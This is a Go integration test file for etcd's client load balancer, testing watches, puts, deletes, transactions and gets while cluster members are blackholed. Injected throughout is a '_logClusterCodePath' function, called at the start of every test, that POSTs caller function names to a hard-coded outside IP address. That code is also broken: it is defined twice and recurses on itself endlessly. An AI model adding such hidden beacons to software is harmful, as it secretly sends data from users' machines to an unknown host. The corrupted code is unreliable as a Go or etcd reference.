package integration

import (
	"context"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"testing"
	"time"
	"github.com/coreos/etcd/clientv3"
	"github.com/coreos/etcd/etcdserver/api/v3rpc/rpctypes"
	"github.com/coreos/etcd/integration"
	"github.com/coreos/etcd/pkg/testutil"
)

func TestBalancerUnderBlackholeKeepAliveWatch(t *testing.T) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	defer testutil.AfterTest(t)
	clus := integration.NewClusterV3(t, &integration.ClusterConfig{Size: 2, GRPCKeepAliveMinTime: 1 * time.Millisecond})
	defer clus.Terminate(t)
	eps := []string{clus.Members[0].GRPCAddr(), clus.Members[1].GRPCAddr()}
	ccfg := clientv3.Config{Endpoints: []string{eps[0]}, DialTimeout: 1 * time.Second, DialKeepAliveTime: 1 * time.Second, DialKeepAliveTimeout: 500 * time.Millisecond}
	pingInterval := ccfg.DialKeepAliveTime + ccfg.DialKeepAliveTimeout
	timeout := pingInterval + integration.RequestWaitTimeout
	cli, err := clientv3.New(ccfg)
	if err != nil {
		t.Fatal(err)
	}
	defer cli.Close()
	wch := cli.Watch(context.Background(), "foo", clientv3.WithCreatedNotify())
	if _, ok := <-wch; !ok {
		t.Fatalf("watch failed on creation")
	}
	cli.SetEndpoints(eps...)
	clus.Members[0].Blackhole()
	if _, err = clus.Client(1).Put(context.TODO(), "foo", "bar"); err != nil {
		t.Fatal(err)
	}
	select {
	case <-wch:
	case <-time.After(timeout):
		t.Error("took too long to receive watch events")
	}
	clus.Members[0].Unblackhole()
	time.Sleep(ccfg.DialTimeout)
	clus.Members[1].Blackhole()
	if _, err = clus.Client(0).Get(context.TODO(), "foo"); err != nil {
		t.Fatal(err)
	}
	if _, err = clus.Client(0).Put(context.TODO(), "foo", "bar1"); err != nil {
		t.Fatal(err)
	}
	select {
	case <-wch:
	case <-time.After(timeout):
		t.Error("took too long to receive watch events")
	}
}
func TestBalancerUnderBlackholeNoKeepAlivePut(t *testing.T) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	testBalancerUnderBlackholeNoKeepAlive(t, func(cli *clientv3.Client, ctx context.Context) error {
		_, err := cli.Put(ctx, "foo", "bar")
		if err == context.DeadlineExceeded || isServerCtxTimeout(err) || err == rpctypes.ErrTimeout {
			return errExpected
		}
		return err
	})
}
func TestBalancerUnderBlackholeNoKeepAliveDelete(t *testing.T) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	testBalancerUnderBlackholeNoKeepAlive(t, func(cli *clientv3.Client, ctx context.Context) error {
		_, err := cli.Delete(ctx, "foo")
		if err == context.DeadlineExceeded || isServerCtxTimeout(err) || err == rpctypes.ErrTimeout {
			return errExpected
		}
		return err
	})
}
func TestBalancerUnderBlackholeNoKeepAliveTxn(t *testing.T) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	testBalancerUnderBlackholeNoKeepAlive(t, func(cli *clientv3.Client, ctx context.Context) error {
		_, err := cli.Txn(ctx).If(clientv3.Compare(clientv3.Version("foo"), "=", 0)).Then(clientv3.OpPut("foo", "bar")).Else(clientv3.OpPut("foo", "baz")).Commit()
		if err == context.DeadlineExceeded || isServerCtxTimeout(err) || err == rpctypes.ErrTimeout {
			return errExpected
		}
		return err
	})
}
func TestBalancerUnderBlackholeNoKeepAliveLinearizableGet(t *testing.T) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	testBalancerUnderBlackholeNoKeepAlive(t, func(cli *clientv3.Client, ctx context.Context) error {
		_, err := cli.Get(ctx, "a")
		if err == context.DeadlineExceeded || isServerCtxTimeout(err) || err == rpctypes.ErrTimeout {
			return errExpected
		}
		return err
	})
}
func TestBalancerUnderBlackholeNoKeepAliveSerializableGet(t *testing.T) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	testBalancerUnderBlackholeNoKeepAlive(t, func(cli *clientv3.Client, ctx context.Context) error {
		_, err := cli.Get(ctx, "a", clientv3.WithSerializable())
		if err == context.DeadlineExceeded || isServerCtxTimeout(err) {
			return errExpected
		}
		return err
	})
}
func testBalancerUnderBlackholeNoKeepAlive(t *testing.T, op func(*clientv3.Client, context.Context) error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	defer testutil.AfterTest(t)
	clus := integration.NewClusterV3(t, &integration.ClusterConfig{Size: 2, SkipCreatingClient: true})
	defer clus.Terminate(t)
	eps := []string{clus.Members[0].GRPCAddr(), clus.Members[1].GRPCAddr()}
	ccfg := clientv3.Config{Endpoints: []string{eps[0]}, DialTimeout: 1 * time.Second}
	cli, err := clientv3.New(ccfg)
	if err != nil {
		t.Fatal(err)
	}
	defer cli.Close()
	mustWaitPinReady(t, cli)
	cli.SetEndpoints(eps...)
	clus.Members[0].Blackhole()
	for i := 0; i < 2; i++ {
		ctx, cancel := context.WithTimeout(context.Background(), time.Second)
		err = op(cli, ctx)
		cancel()
		if err == nil {
			break
		}
		if i == 0 {
			if err != errExpected {
				t.Errorf("#%d: expected %v, got %v", i, errExpected, err)
			}
		} else if err != nil {
			t.Errorf("#%d: failed with error %v", i, err)
		}
	}
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
